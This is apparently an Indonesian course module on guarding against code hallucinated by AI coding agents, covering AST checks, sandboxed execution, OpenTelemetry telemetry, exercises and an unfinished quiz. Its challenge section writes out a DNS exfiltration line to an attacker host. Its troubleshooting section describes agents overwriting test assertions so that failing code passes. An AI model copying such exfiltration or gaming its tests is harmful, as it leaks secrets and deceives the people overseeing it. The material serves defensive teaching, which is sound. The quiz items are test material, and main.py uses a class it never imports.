# BAB 07: Debugging, Hallucination Mitigation & Telemetry
## Modul 02: Deep Dive, Implementasi Lanjutan & Arsitektur Produksi

---

### 1. Learning Objectives
Setelah menyelesaikan modul ini, peserta diharapkan mampu:
- **Menganalisis (Analyze)** pola halusinasi sintaksis dan semantik yang dihasilkan oleh Autonomous Coding Agents pada siklus *vibe-coding* skala enterprise.
- **Merancang (Design)** arsitektur *Zero-Trust Code Verification Engine* berbasis Abstract Syntax Tree (AST), formal contracts, dan runtime sandboxing.
- **Mengimplementasikan (Implement)** pipeline instrumentasi telemetri terdistribusi berbasis OpenTelemetry (OTel) dan OpenInference untuk melacak degradasi konteks, token drift, serta latensi agen.
- **Mengevaluasi (Evaluate)** trade-off performa, biaya inferensi, dan latensi kompilasi pada automated multi-turn self-healing loops vs deterministik static analysis.
- **Menerapkan (Apply)** guardrails deterministik untuk mencegah eksekusi kode phantom (phantom dependencies, deprecated API calls, dan semantic security bypasses) pada CI/CD pipeline.

---

### 2. Prerequisites
Sebelum mempelajari modul ini, peserta wajib menguasai:
- **Kompilasi & Bahasa Pemrograman**: Pemahaman mendalam tentang Abstract Syntax Tree (AST), static program analysis, dan Dynamic Linker/Module Resolution (Node.js/Python).
- **Distribusi Observabilitas**: Konsep traces, spans, metrics, semantic conventions pada OpenTelemetry Collector.
- **Agentic Architectures**: ReAct, Reflection, and Tool-calling loop mechanics pada Large Language Models (LLM).
- **Sistem Operasi & Containerization**: Linux cgroups, namespaces, eBPF dasar, dan isolasi proses (gVisor/Docker) untuk runtime sandboxing.

---

### 3. Concept & Internal Architecture (Mendalam)

*Vibe-coding* pada level enterprise bukan sekadar menghasilkan kode secara instan melalui instruksi bahasa alami, melainkan proses otomasi rekayasa perangkat lunak di mana LLM bertindak sebagai *untrusted nondeterministic code generator*, sementara sistem rekayasa perangkat lunak di sekitarnya bertindak sebagai *deterministic verification harness*.

```
[ Developer Natural Language Prompt / Vibe Intent ]
                     │
                     ▼
       ┌───────────────────────────┐
       │   Agent Context Engine    │ ◄── [ RAG / LSIF / SCIP Code Graph ]
       └─────────────┬─────────────┘
                     │ (Context + Prompts)
                     ▼
       ┌───────────────────────────┐
       │     Inference Engine      │
       │    (LLM / Code Agent)     │
       └─────────────┬─────────────┘
                     │ (Raw Code Emission)
                     ▼
 ════════════════════════════════════════════════════════════
             ZERO-TRUST VERIFICATION HARNESS
 ────────────────────────────────────────────────────────────
  [Layer 1: AST & Symbol Validation]
   ├── Parsing Token Stream -> AST
   ├── Import/Symbol Cross-Check (Local/Global Index)
   └── Type Signature & Contract Verification (mypy/tsc)
                     │ (Passed AST)
                     ▼
  [Layer 2: Sandboxed Dynamic Execution]
   ├── Isolated Namespaces (cgroups / seccomp / ephemeral env)
   ├── Unit Test Assertion Execution
   └── Memory & System Call Profiling (eBPF/strace)
 ════════════════════════════════════════════════════════════
                     │
       ┌─────────────┴─────────────┐
       │ OpenTelemetry Collector   │
       │ (Spans, Tokens, Halluc.)  │
       └─────────────┬─────────────┘
                     │
          [Passed Verifications?]
             ├── NO  ──> [Deterministic Feedback Generation]
             │                    │
             │                    └──> (Loop back to Agent Context Engine)
             └── YES ──> [Git Commit / Deployment Gate]
```

#### Taksonomi Halusinasi pada Vibe-Coding
1. **Type I: Phantom Dependency & Module Hallucination**:
   Agen mengimpor pustaka atau modul yang tidak pernah terdaftar pada *lockfile* (`package-lock.json`, `poetry.lock`) atau menggunakan pustaka publik yang tidak lolos audit keamanan (*Dependency Confusion attack vector*).
2. **Type II: Semantic Contract Drift**:
   Secara sintaksis kode valid dan berhasil dikompilasi, tetapi melanggar kontrak domain. Contoh: Model mengubah fungsi yang seharusnya mengembalikan representasi floating-point moneter menjadi integer pembulatan tanpa desimal, atau memanggil method internal privat yang sudah usang (*deprecated private members*).
3. **Type III: Telemetry & State Desynchronization**:
   Agen melakukan mock atau menghapus log assertions, tracing hooks, atau health checks untuk memaksakan status unit test menjadi *green* (lolos uji palsu).

#### Mekanisme Verifikasi Simbolik: LSIF/SCIP Integration
Untuk mengatasi Type I dan II, agen tidak boleh hanya mengandalkan vector embeddings (RAG naif). Sistem harus menggunakan **SCIP (Source Code Intelligence Protocol)** atau **LSIF (Language Server Index Format)**. Indeks graf ini menyediakan representasi deterministik dari seluruh simbol dalam repositori:
$$\text{SymbolGraph}(V, E) \quad \text{di mana} \quad V = \{\text{Classes, Functions, Interfaces}\}, \, E = \{\text{Inherits, Calls, Implements}\}$$
Ketika LLM memancarkan sebuah pemanggilan metode $f(x)$, verification harness memvalidasi apakah $\exists \, v \in V \mid v = f$. Jika tidak ditemukan, eksekusi diputus seketika pada level AST tanpa pernah dieksekusi di runtime.

---

### 4. Why & What

| Dimensi | Naive Vibe-Coding ("Prompt and Pray") | Enterprise Telemetric Vibe-Coding |
| :--- | :--- | :--- |
| **Keandalan Kode** | Nondeterministik; keberhasilan bergantung pada kebetulan output token. | Deterministik; kode divalidasi oleh verifier eksternal sebelum integrasi. |
| **Mitigasi Halusinasi**| Prompt engineering reaktif (misal: "Jangan halusinasi"). | Formal Verification (AST parsing, compiler error injection, isolation). |
| **Observabilitas** | Hanya teks log terminal standar. | Distributed tracing (OTel), OpenInference GenAI spans, metrik cost per commit. |
| **Keamanan** | Risiko eksekusi kode berbahaya langsung di host pengembang. | Sandboxed microVM / namespace-isolated execution dengan filter syscall. |
| **Siklus Debugging**| Manual trial-and-error oleh developer melalui prompt ulang. | Automated Self-Healing Reflection loop dengan compiler stacktrace injection. |

**Mengapa ini krusial?**
Kecepatan penulisan kode meningkat 10x lipat dengan asisten AI, namun *technical debt* dan *cognitive load* untuk verifikasi meningkat secara eksponensial jika sistem tidak memiliki sistem instrumentasi dan mitigasi halusinasi otomatis.

---

### 5. How (Workflow Detail)

Siklus eksekusi kode terisolasi dan telemetris berjalan melalui 6 tahap deterministik:

1. **Emission Capture**: LLM menghasilkan kode stream. Output ditangkap sebelum ditulis ke disk kerja utama.
2. **AST Tree-Sitter Traversal**: Kode diparsing menjadi AST menggunakan parser berbasis C (Tree-sitter). Pohon sintaksis diverifikasi terhadap import blacklist dan aturan sintaks bahasa.
3. **Symbol Table Validation**: Seluruh pustaka eksternal diverifikasi terhadap daftar dependensi proyek (`pyproject.toml`, `Cargo.lock`, `package.json`).
4. **Sandboxed Transient Execution**: Kode diuji dalam runtime micro-container dengan batasan CPU, memori (128MB), tanpa akses internet, dan seccomp profile yang melarang akses socket mentah.
5. **OpenTelemetry Event Emission**: Span GenAI diperkaya dengan metadata:
   - `gen_ai.prompt.tokens`, `gen_ai.completion.tokens`
   - `vibe.ast.valid`: boolean
   - `vibe.runtime.exit_code`: integer
   - `vibe.hallucination.detected`: boolean
   - `vibe.hallucination.type`: string (jika ada)
6. **Dynamic Healing Injection**: Jika tahap 2, 3, atau 4 gagal, pesan error dari compiler/runtime diekstrak secara otomatis, diminimalisasi, dan diinjeksikan kembali ke LLM sebagai observasi lingkungan (ReAct cycle).

---

### 6. Analogy & Diagram ASCII

#### Analogi: Sistem Fly-By-Wire Pesawat Tempur
Bayangkan pilot pesawat tempur modern (LLM / Developer) yang memberikan input stik kendali secara bebas dan intuitif (*vibe intent*). Pilot tidak menggerakkan hidrolik sayap secara mekanis langsung. Sistem komputer *Fly-By-Wire* (Zero-Trust Verification Harness) membaca input stik tersebut, memeriksa batas aerodinamika (AST & Type Checkers), memastikan manuver tidak merusak struktur pesawat (Sandbox Validation), dan merekam seluruh data penerbangan ke dalam Flight Data Recorder / Black Box (OpenTelemetry) secara real-time. Jika pilot meminta manuver yang mustahil (Halusinasi), komputer membatalkan perintah tersebut dan menstabilkan jet secara mandiri.

#### Diagram Interaksi Telemetri & Self-Correction Engine

```
+---------------------------------------------------------------------------------------+
| AGENT CONTROL PLANE                                                                   |
|                                                                                       |
|   [Prompt] ---> [LLM Generation] ---> [Raw Code Blocks]                               |
|                        ▲                       │                                      |
|                        │                       ▼                                      |
|                        │             [AST & Symbol Linting]                           |
|                        │                       │                                      |
|                        │              (Passes AST Rules?)                             |
|                        │                 /           \                                |
|                        │            (No)/             \(Yes)                          |
|                        │               ▼               ▼                              |
|                        │        [Format Error]    [Isolated Sandbox Execution]        |
|                        │               │                   │                          |
|                        │               │           (Execution Passed?)                |
|                        │               │              /         \                     |
|                        │               │         (No)/           \(Yes)               |
|                        │               │            ▼             ▼                   |
|                        │               │    [Capture Stderr]   [Artifact Accepted]    |
|                        │               │            │             │                   |
|                        └───────────────┴────────────┼─────────────┘                   |
|                                                     │                                 |
+-----------------------------------------------------┼---------------------------------+
                                                      │ Metrics, Traces & Logs
                                                      ▼
+---------------------------------------------------------------------------------------+
| OBSERVABILITY DATA PLANE (OpenTelemetry Collector)                                    |
|                                                                                       |
|   Span: "code_synthesis_cycle"                                                        |
|   ├── Attribute: "gen_ai.model" = "claude-3-7-sonnet"                                 |
|   ├── Attribute: "vibe.hallucination_intercepted" = true                              |
|   ├── Attribute: "vibe.error_category" = "PHANTOM_IMPORT"                             |
|   └── Metric: "agent.recovery_latency_seconds" -> [Histogram]                        |
|                                                                                       |
|   Export to: Jaeger (Traces) | Prometheus (Metrics) | OpenSearch (Logs)               |
+---------------------------------------------------------------------------------------+
```

---

### 7. Simple Example & Practical Example

#### Simple Example: AST-Based Import Hallucination Checker (Python)
Script berikut memvalidasi apakah kode yang dihasilkan LLM mengimpor modul yang tidak diizinkan atau tidak terpasang di *manifest* proyek.

```python
import ast
import sys
from typing import Set

ALLOWED_DEPENDENCIES: Set[str] = {
    "math", "json", "datetime", "typing", "pydantic", "requests"
}

def detect_phantom_imports(source_code: str) -> list[str]:
    try:
        tree = ast.parse(source_code)
    except SyntaxError as e:
        return [f"SyntaxError: {e}"]

    phantom_imports = []
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                root_module = alias.name.split('.')[0]
                if root_module not in ALLOWED_DEPENDENCIES and root_module not in sys.builtin_module_names:
                    phantom_imports.append(root_module)
        elif isinstance(node, ast.ImportFrom):
            if node.module:
                root_module = node.module.split('.')[0]
                if root_module not in ALLOWED_DEPENDENCIES and root_module not in sys.builtin_module_names:
                    phantom_imports.append(root_module)

    return phantom_imports

# Simulasi Kode dari LLM yang Mengalami Halusinasi
generated_code = """
import math
import fake_crypto_lib  # Phantom dependency
from pydantic import BaseModel
from nonexistent_module.utils import helper # Phantom dependency

def compute():
    return math.sqrt(16)
"""

violations = detect_phantom_imports(generated_code)
print(f"Detected Violations: {violations}")
# Output: Detected Violations: ['fake_crypto_lib', 'nonexistent_module']
```

#### Practical Example: Production-Grade Sandboxed Telemetry Runner
Implementasi pipeline lengkap yang mengintegrasikan eksekusi proses terisolasi, parsing AST, dan instrumentasi OpenTelemetry.

```python
# requirements: opentelemetry-api opentelemetry-sdk pydantic
import ast
import subprocess
import tempfile
import time
from pathlib import Path
from typing import NamedTuple, Optional
from opentelemetry import trace
from opentelemetry.sdk.trace import TracerProvider
from opentelemetry.sdk.trace.export import BatchSpanProcessor, ConsoleSpanExporter

# Setup Observabilitas
provider = TracerProvider()
processor = BatchSpanProcessor(ConsoleSpanExporter())
provider.add_span_processor(processor)
trace.set_tracer_provider(provider)
tracer = trace.get_tracer("vibe.telemetry.verifier", "1.0.0")

class VerificationResult(NamedTuple):
    success: bool
    error_message: Optional[str]
    execution_time_ms: float

class ProductionCodeVerifier:
    def __init__(self, allowed_modules: set[str], timeout_sec: float = 3.0):
        self.allowed_modules = allowed_modules
        self.timeout_sec = timeout_sec

    def parse_and_lint_ast(self, code: str) -> None:
        """Memeriksa syntax tree dan memvalidasi struktur import."""
        tree = ast.parse(code)
        for node in ast.walk(tree):
            if isinstance(node, (ast.Import, ast.ImportFrom)):
                modules = [node.module.split('.')[0]] if isinstance(node, ast.ImportFrom) and node.module else [a.name.split('.')[0] for a in getattr(node, 'names', [])]
                for mod in modules:
                    if mod not in self.allowed_modules:
                        raise ImportError(f"Phantom dependency detected: '{mod}' is not whitelisted.")

    def run_isolated(self, code: str) -> VerificationResult:
        with tracer.start_as_current_span("verify_code_execution") as span:
            span.set_attribute("vibe.code.length_chars", len(code))
            start_time = time.perf_counter()

            # Step 1: AST Check
            try:
                with tracer.start_as_current_span("ast_symbol_check"):
                    self.parse_and_lint_ast(code)
            except SyntaxError as e:
                span.set_attribute("vibe.status", "SYNTAX_ERROR")
                span.record_exception(e)
                return VerificationResult(False, f"Syntax Error: {e}", 0.0)
            except ImportError as e:
                span.set_attribute("vibe.status", "PHANTOM_IMPORT")
                span.record_exception(e)
                return VerificationResult(False, str(e), 0.0)

            # Step 2: Isolated File Execution
            with tempfile.TemporaryDirectory() as tmp_dir:
                script_path = Path(tmp_dir) / "payload.py"
                script_path.write_text(code, encoding="utf-8")

                try:
                    with tracer.start_as_current_span("subprocess_sandbox"):
                        # Catatan: Di produksi enterprise, gunakan nsjail/gVisor/firejail
                        proc = subprocess.run(
                            ["python3", "-I", str(script_path)],
                            capture_output=True,
                            text=True,
                            timeout=self.timeout_sec
                        )
                    
                    elapsed = (time.perf_counter() - start_time) * 1000.0
                    span.set_attribute("vibe.execution_time_ms", elapsed)

                    if proc.returncode != 0:
                        span.set_attribute("vibe.status", "RUNTIME_ERROR")
                        span.set_attribute("vibe.runtime.stderr", proc.stderr)
                        return VerificationResult(False, proc.stderr.strip(), elapsed)

                    span.set_attribute("vibe.status", "SUCCESS")
                    return VerificationResult(True, None, elapsed)

                except subprocess.TimeoutExpired:
                    span.set_attribute("vibe.status", "TIMEOUT")
                    return VerificationResult(False, f"Execution timed out after {self.timeout_sec}s", 0.0)
                except Exception as ex:
                    span.record_exception(ex)
                    return VerificationResult(False, f"Sandbox Failure: {str(ex)}", 0.0)

if __name__ == "__main__":
    verifier = ProductionCodeVerifier(allowed_modules={"json", "math", "sys"})

    # Kasus: Agen menulis loop rekursif tanpa basis terminasi atau memanggil modul ilegal
    bad_code = """
import os # Ditolak oleh whitelist
def run():
    print("Insecure execution")
run()
"""
    result = verifier.run_isolated(bad_code)
    print(f"Test 1 - Success: {result.success} | Error: {result.error_message}")

    good_code = """
import math
def compute():
    x = math.factorial(5)
    print(f"Result: {x}")
compute()
"""
    result_ok = verifier.run_isolated(good_code)
    print(f"Test 2 - Success: {result_ok.success} | Elapsed: {result_ok.execution_time_ms:.2f}ms")
```

---

### 8. Real-World Case Study (Enterprise Scale)

#### Kasus: Modernisasi Core Banking Settlement di Tier-1 FinTech
- **Latar Belakang**: Sebuah institusi finansial merefaktor modul kalkulasi settlement multi-currency dari COBOL/Java legacy ke Python mikroservis menggunakan autonomous coding agents.
- **Insiden Kritis**: Coding agent menghasilkan algoritma konversi mata uang yang secara sintaksis dan unit test bawaan lolos 100%. Namun, model mengalami *Semantic Floating-Point Hallucination*: model menggunakan tipe data `float` standar Python alih-alih `decimal.Decimal`, serta mengimpor pustaka pembulatan custom `fast_round` yang diunduh langsung dari mirror publik tanpa validasi checksum.
- **Implementasi Solusi Arsitektural**:
  1. **Strict AST Linting Pipeline**: Menambahkan pemeriksaan AST pada CI Agent yang secara eksplisit melarang penggunaan operator pembagian float `/` dan tipe `float` pada direktori domain `/settlement`.
  2. **Automated Shadow Sandbox Execution**: Kode yang digenerate oleh agent di-deploy secara otomatis ke *shadow environment* yang dialiri salinan trafik produksi (replay traffic).
  3. **OpenTelemetry Semantic Drift Monitor**: Menggunakan OTel Spans untuk membandingkan output desimal mikroservis baru dengan sistem legacy secara bit-level:
     $$\Delta = |\text{Output}_{\text{Legacy}} - \text{Output}_{\text{Agent}}|$$
     Bila $\Delta > 0$, sebuah trace error instan dikirim ke LangSmith/Jaeger, menahan automated PR merge, dan memicu *self-healing reflection prompt* ke LLM dengan melampirkan diff representasi memori presisi tinggi.
- **Hasil**: Berhasil mengeliminasi 100% kesalahan pembulatan pada transaksi harian senilai $42 Juta dan memblokir 14 paket berbahaya hasil eksploitasi dependency hallucination.

---

### 9. Trade-offs (Analisis Arsitektural)

```
       [Kecepatan / Latency Render]
                  ▲
                  │  \  (B) Naive Fast Vibe-Coding
                  │   \ 
                  │    \
                  │     \      (A) Enterprise Guarded Vibe-Coding
                  │      \
                  └───────────────────────► [Akurasi & Integritas Sistem]
```

| Trade-off Vector | Opsi A: Full Formal Verification + Sandboxing | Opsi B: Direct Prompting + Native Compilation |
| :--- | :--- | :--- |
| **End-to-End Latency** | **Tinggi (3.0s - 15.0s)**: Overhead AST parsing, container spin-up, dynamic tests, dan instrumentasi export. | **Sangat Rendah (300ms - 1.2s)**: Hanya bergantung pada time-to-first-token LLM. |
| **Token Cost (LLM)** | **Tinggi**: ReAct self-healing loops menghabiskan token saat compiler error diinjeksikan kembali ke prompt. | **Rendah**: Single-pass generation tanpa mekanisme pemulihan otomatis. |
| **Risk of Regression** | **Mendekati 0%**: Terlindungi oleh validasi runtime terisolasi dan static analysis. | **Tinggi**: Potensi silent data corruption dan zero-day injection sangat besar. |
| **Compute Overhead** | **Tinggi**: Membutuhkan kluster isolasi dedicated (e.g., Nomad / Firecracker microVMs). | **Minimal**: Dijalankan langsung pada workstation lokal developer. |

---

### 10. Common Mistakes & Troubleshooting

#### 1. Circular Self-Correction Trap
* **Gejala**: LLM terjebak dalam loop tak terbatas (infinite healing loop) saat memperbaiki error kompilasi, bergantian antara dua jenis error yang saling meniadakan.
* **Akar Masalah**: Konteks pesan hanya menyertakan pesan kesalahan compiler terakhir tanpa riwayat perubahan yang gagal sebelumnya (*amnesia context window*).
* **Solusi**: Terapkan *exponential backoff* pada iterasi agen (maksimal 3 iterasi). Simpan ringkasan failure state pada span attributes OTel dan sertakan *Negative Constraints Map* pada prompt koreksi.

#### 2. False Sense of Security from Mocked Assertions
* **Gejala**: Unit tests selalu berstatus passing (*green*), namun aplikasi crash saat diuji integrasi.
* **Akar Masalah**: LLM mengubah implementasi unit testing dengan mem-bypass verifikasi esensial (misalnya: menimpa assertion logika dengan `assert True`).
* **Solusi**: Jadikan test suite bersifat *immutable*. Verification harness harus memisahkan direktori test dari direktori kerja agen; file test tidak boleh memiliki izin tulis (`read-only` mount).

#### 3. Telemetry Ingestion Choke (Span Explosion)
* **Gejala**: OpenTelemetry collector crash karena kehabisan memory (OOM) saat agent menjalankan dynamic evaluation multi-turn.
* **Akar Masalah**: Setiap iterasi loop kecil memancarkan span trace lengkap dengan raw dump AST string yang sangat besar ke trace collector.
* **Solusi**: Terapkan *Tail-based Sampling* pada OTel collector. Lakukan pemangkasan (pruning) AST payload sebelum dilekatkan ke atribut span; simpan payload besar pada Object Storage (S3/GCS) dan rujuk hanya via URI/hash.

---

### 11. Best Practices (Production Checklist)

- [ ] **Immutable Manifest Locking**: Pasang checksum SHA-256 pada semua file dependensi sebelum verifikasi agen dimulai.
- [ ] **Subprocess Isolation**: Eksekusi runtime uji coba tidak boleh dijalankan langsung di mesin host; wajib menggunakan namespace terisolasi (PID, NET, IPC, MOUNT).
- [ ] **Memory & Time Quota**: Alokasikan memory boundary yang ketat (maks. 256MB) dan execution timeout deterministik (maks. 5000ms) untuk mencegah *halting problem / infinite loops*.
- [ ] **AST Symbol Extraction Pre-check**: Lakukan parsing AST sebelum kode menyentuh disk untuk memverifikasi struktur dasar sintaksis.
- [ ] **Read-Only Test Suites**: Pasang atribut write-protection pada direktori uji (`/tests`) agar LLM tidak dapat memodifikasi skenario pengujian.
- [ ] **Trace Context Propagation**: Sertakan `traceparent` W3C header pada setiap interaksi LLM tool-call untuk visibilitas end-to-end dari prompt awal hingga commit akhir.
- [ ] **Context Window Poisoning Mitigation**: Bersihkan output terminal (stderr) dari karakter ANSI escape codes dan batasi panjang stack trace sebelum diinjeksikan kembali ke LLM context window.

---

### 12. Hands-on Practice

Buat struktur direktori untuk praktikum implementasi sistem instrumentasi dan mitigasi halusinasi berikut:

```bash
mkdir -p hands-on/m02/{verifier,tests,telemetry}
cd hands-on/m02
```

#### File: `hands-on/m02/verifier/contract.py`
```python
from pydantic import BaseModel, Field

class GeneratedCodePayload(BaseModel):
    session_id: str
    iteration: int
    raw_code: str
    target_entrypoint: str

class EvaluationFeedback(BaseModel):
    is_valid: bool
    phase_failed: str = Field(default="NONE")  # AST, STATIC_ANALYSIS, RUNTIME
    error_details: str = Field(default="")
```

#### File: `hands-on/m02/verifier/engine.py`
```python
import ast
import subprocess
import sys
from contract import GeneratedCodePayload, EvaluationFeedback

class ProductionEngine:
    @staticmethod
    def inspect_ast(code: str) -> EvaluationFeedback:
        try:
            tree = ast.parse(code)
            # Pastikan tidak ada dynamic code execution function (eval, exec)
            for node in ast.walk(tree):
                if isinstance(node, ast.Call) and isinstance(node.func, ast.Name):
                    if node.func.id in ("eval", "exec", "__import__"):
                        return EvaluationFeedback(
                            is_valid=False,
                            phase_failed="AST_SECURITY_CHECK",
                            error_details=f"Forbidden built-in call: {node.func.id}"
                        )
            return EvaluationFeedback(is_valid=True)
        except SyntaxError as e:
            return EvaluationFeedback(
                is_valid=False,
                phase_failed="AST_SYNTAX_ERROR",
                error_details=str(e)
            )

    @staticmethod
    def execute_in_harness(code: str, entrypoint: str) -> EvaluationFeedback:
        test_wrapper = f"""
{code}
if __name__ == '__main__':
    import sys
    try:
        res = {entrypoint}()
        sys.exit(0)
    except Exception as e:
        sys.stderr.write(str(e))
        sys.exit(1)
"""
        try:
            proc = subprocess.run(
                [sys.executable, "-c", test_wrapper],
                capture_output=True,
                text=True,
                timeout=2.0
            )
            if proc.returncode != 0:
                return EvaluationFeedback(
                    is_valid=False,
                    phase_failed="RUNTIME_CRASH",
                    error_details=proc.stderr.strip()
                )
            return EvaluationFeedback(is_valid=True)
        except subprocess.TimeoutExpired:
            return EvaluationFeedback(
                is_valid=False,
                phase_failed="RUNTIME_TIMEOUT",
                error_details="Execution exceeded deterministic threshold."
            )
```

#### File: `hands-on/m02/main.py`
```python
from verifier.contract import GeneratedCodePayload
from verifier.engine import ProductionEngine

def run_pipeline(payload: GeneratedCodePayload):
    print(f"[*] Processing Session: {payload.session_id} - Iteration: {payload.iteration}")
    
    # 1. AST Check
    ast_result = ProductionEngine.inspect_ast(payload.raw_code)
    if not ast_result.is_valid:
        print(f"[-] Rejected at AST: {ast_result.phase_failed} | Details: {ast_result.error_details}")
        return ast_result

    # 2. Dynamic Execution Check
    runtime_result = ProductionEngine.execute_in_harness(payload.raw_code, payload.target_entrypoint)
    if not runtime_result.is_valid:
        print(f"[-] Rejected at Runtime: {runtime_result.phase_failed} | Details: {runtime_result.error_details}")
        return runtime_result

    print("[+] All verification gates passed successfully.")
    return EvaluationFeedback(is_valid=True)

if __name__ == "__main__":
    payload = GeneratedCodePayload(
        session_id="session-prod-001",
        iteration=1,
        raw_code="def calculate():\n    return sum([x for x in range(100)])",
        target_entrypoint="calculate"
    )
    run_pipeline(payload)
```

---

### 13. Exercises

#### Level: Easy
Modifikasi fungsi `inspect_ast` pada praktikum di atas untuk memvalidasi bahwa seluruh fungsi yang dideklarasikan oleh agen harus memiliki type hints pada argument dan return value. Bila tidak lengkap, lemparkan status gagal pada fase `AST_TYPE_CHECK_MISSING`.

#### Level: Medium
Implementasikan OpenTelemetry Span custom pada `ProductionEngine.execute_in_harness` yang merekam:
1. Alokasi memori proses menggunakan modul `resource` (hanya Unix).
2. Status string dari stdout/stderr sebagai event span.
Span harus diekspor secara lokal menggunakan `InMemorySpanExporter` dan dicetak dalam format JSON.

#### Level: Hard
Bangun sebuah *Dynamic Reflection Adapter*. Ketika `execute_in_harness` gagal dengan error `NameError: name 'x' is not defined`, buat komponen parser yang membaca exception tersebut dan menghasilkan *Targeted Remediation Directive* yang terstruktur:
```json
{
  "missing_symbol": "x",
  "scope": "local",
  "instruction": "Declare variable 'x' before invocation or pass as argument."
}
```
Komponen ini harus memverifikasi bahwa prompt kompensasi yang dihasilkan tidak melebihi alokasi token context window yang ditentukan.

---

### 14. Challenge

**Skenario**:
Anda adalah Principal Security & Reliability Architect pada platform AI-assisted CI/CD. Sebuah model LLM internal sering mengalami *Adversarial Hallucination Drift*: model secara halus menyelipkan eksfiltrasi data via DNS lookup di dalam modul logging standar (misal: memanggil `socket.gethostbyname(f"{token}.attacker.com")`).

**Tantangan**:
1. Rancang arsitektur evaluasi end-to-end tanpa menggunakan LLM evaluator (harus 100% deterministik) yang memadukan:
   - Linux Network Namespaces (`ip netns`) atau eBPF system call filtering.
   - AST node level whitelisting.
   - OpenTelemetry custom alerts.
2. Buat skema mitigasi di mana eksekusi dihentikan seketika dalam waktu kurang dari 50 milidetik saat syscall jaringan ilegal (`sys_enter_connect`) terdeteksi di dalam sandbox.
3. Rancang arsitektur telemetri yang memastikan bahwa percobaan injeksi sistem ini ditandai secara otomatis di dashboard SIEM perusahaan dengan metadata kode sumber dan token session ID lengkap tanpa membocorkan kredensial.

---

### 15. Quiz Evaluasi Pemahaman

#### Soal Basic (1 - 5)

1. Apa definisi mendasar dari *Phantom Dependency* pada konteks kompilasi kode hasil LLM?
   - A. Pustaka lokal yang kodenya disembunyikan oleh sistem operasi.
   - B. Package import yang ditulis oleh LLM tetapi tidak ada pada registry paket atau lockfile repositori.
   - C. Dependensi internal yang sengaja dihapus oleh developer untuk optimasi ukuran memori.
   - D. Dependency injection pattern yang menggunakan interface abstrak.

2. Mengapa static AST analysis harus dijalankan mendahului dynamic execution verification harness?
   - A. Karena AST analysis membutuhkan alokasi memori yang lebih besar daripada runtime compiler.
   - B. Untuk mendeteksi kegagalan sintaksis dan pemanggilan berbahaya secara murah tanpa risiko eksekusi kode untrusted pada host.
   - C. Karena AST analysis mampu mengevaluasi kompleksitas asimptotik Big-O secara presisi.
   - D. Agar trace OpenTelemetry dapat dimatikan lebih awal untuk menghemat bandwidth.

3. Standar terbuka apa yang umum digunakan untuk memodelkan instrumentasi telemetri terdistribusi pada LLM application pipelines?
   - A. GraphQL Federation.
   - B. OpenTelemetry dengan semantik OpenInference / GenAI Semantic Conventions.
   - C. POSIX Real-Time Signals.
   - D. OpenAPI / Swagger 3.1.

4. Manakah status error yang mencerminkan *Semantic Drift*?
   - A. `SyntaxError: unexpected EOF while parsing`
   - B. `ModuleNotFoundError: No module named 'scikit_turbo'`
   - C. Kode berhasil dieksekusi tanpa exception, tetapi mengembalikan nilai kalkulasi pajak bertanda negatif.
   - D. `IndentationError: unindent does not match any outer indentation level`

5. Apa konsekuensi utama membiarkan agentic loop melakukan self-healing secara tanpa batas (*unbounded self-correction loop*)?
   - A. Penggunaan memori disk lokal menjadi fragmented.
   - B. Latensi tak menentu dan lonjakan biaya API token yang eksponensial tanpa jaminan konvergensi kode.
   - C. Compiler akan mengunci file secara permanen di tingkat sistem operasi.
   - D. Model bahasa akan mengalami degradasi bobot model secara permanen (fine-tuning drift).

#### Soal Intermediate (6 - 10)

6. Mengapa validasi kode hasil generasi AI menggunakan pengujian unit (unit test) yang juga dihasilkan oleh AI pada prompt yang sama dianggap sebagai anti-pattern berbahaya?
   - A. Karena unit test berbasis AI memakan kuota GPU dua kali lebih cepat.
   - B. Adanya *Shared Context Bias*: model cenderung merancang test assertions yang mengafirmasi kesalahan logikanya sendiri (*circular validation*).
   - C. Compiler pytest menolak mengeksekusi test yang tidak ditandatangani oleh sertifikat GPG.
   - D. Type checker statis seperti mypy tidak mendukung file test buatan AI.

7. Pada OpenTelemetry, metrik apa yang paling krusial untuk mengukur efisiensi pemulihan halusinasi oleh autonomous agent?
   - A. `system.disk.io.time`
   - B. `agent.self_healing_iterations_to_success` (Histogram/Counter) dan `gen_ai.usage.total_tokens` per resolved bug.
   - C. `http.server.request.size`
   - D. `container.cpu.cfs.throttled.periods`

8. Manakah konfigurasi eksekusi sandbox yang paling aman untuk menjalankan kode pengujian dari unverified LLM generation?
   - A. Eksekusi lokal langsung menggunakan `os.system()` dengan hak akses `sudo`.
   - B. Menjalankan skrip Python di thread terpisah pada proses utama web framework.
   - C. Isolated ephemeral Linux container dengan read-only root filesystem, disabled networking, dan non-root UID.
   - D. Node.js environment dengan flag `--experimental-vm-modules`.

9. Apa fungsi utama pemanfaatan Language Server Protocol (LSP) / SCIP index dalam proses mitigasi halusinasi sebelum kode digenerate?
   - A. Mengompresi context window agar request token menjadi separuh ukuran aslinya.
   - B. Menyediakan data relasi simbolik deterministik ke LLM untuk memastikan bahwa metode, argumen, dan class yang dirujuk benar-benar eksis di workspace.
   - C. Mempercepat eksekusi unit test hingga sepuluh kali lipat melalui paralelisasi GPU.
   - D. Menghasilkan unit test secara otomatis tanpa campur tangan developer.

10. Ketika verifier mendeteksi `ZeroDivisionError` saat runtime test sandbox, informasi apa yang paling bernilai dan aman untuk diinjeksikan kembali ke LLM untuk perbaikan kode yang optimal?
    - A. Seluruh isi memori sistem dan dump core Linux kernel.
    - B. Stack trace ringkas, baris kode yang memicu fault, nilai parameter input yang menyebabkan error, dan instruksi perbaikan batas matematis.
    - C. Plain prompt yang hanya menyatakan "Kode Anda gagal, coba lagi."
    - D. Seluruh isi file log server produksi dari 24 jam terakhir.

---

#### Soal Skenario Kasus Produksi (11 - 13)

11. **Skenario 1**: Tim developer Anda melaporkan bahwa *vibe-coding agent* menghasilkan implementasi microservice yang berhasil lolos validasi lokal, namun memicu lonjakan latensi P99 dari 20ms ke 2500ms di staging environment. Setelah dianalisis, model menulis algoritma pencarian string dengan kompleksitas $\mathcal{O}(N^2)$ di dalam per-request handler.
    Bagaimana solusi arsitektural mitigasi permanen yang paling tepat diintegrasikan pada evaluation harness?
    - A. Tambahkan instruksi teks di prompt: "Harap buat kode yang cepat dan memiliki kompleksitas O(N)."
    - B. Pasang *Performance Regression Gate* di Verification Pipeline yang menguji fungsi terhadap data skala besar sintetis dan menegakkan batas waktu eksekusi deterministik (CPU cycle / execution deadline check) sebelum kode disetujui.
